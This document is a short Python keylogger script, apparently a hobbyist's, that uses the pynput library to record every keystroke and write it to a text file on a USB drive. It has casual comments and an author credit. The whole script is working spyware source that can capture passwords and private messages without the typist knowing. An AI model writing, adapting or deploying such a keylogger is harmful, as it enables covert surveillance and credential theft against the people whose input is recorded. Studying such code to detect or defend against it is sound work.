import os #to ensure smooth operation on devices
from pynput import keyboard # to read keyboard input

# Assuming your USB drive is D:
usb_drive = "D:\\"
keylog_file = os.path.join(usb_drive, "keyfile.txt") #This is where we save our logged keys aka user input

def keyPressed(key):
    with open(keylog_file, "a", encoding="utf-8") as logKey: #utf-8 is used to enhance the range of inputs our program can have
        try:
            logKey.write(key.char) #writes to the program (well duh what did u think!!)
            logKey.flush()  # Force write to disk since i was having issues u can safely remove it.
        except AttributeError:
            logKey.write(f"[{key}]")  # Handling for special keys, this line still gives error for some reason
            logKey.flush()

if __name__ == "__main__":
    with keyboard.Listener(on_press=keyPressed) as listener:
        listener.join()


#built differently by Anyash
# with a lil help from yt and the Internet ;)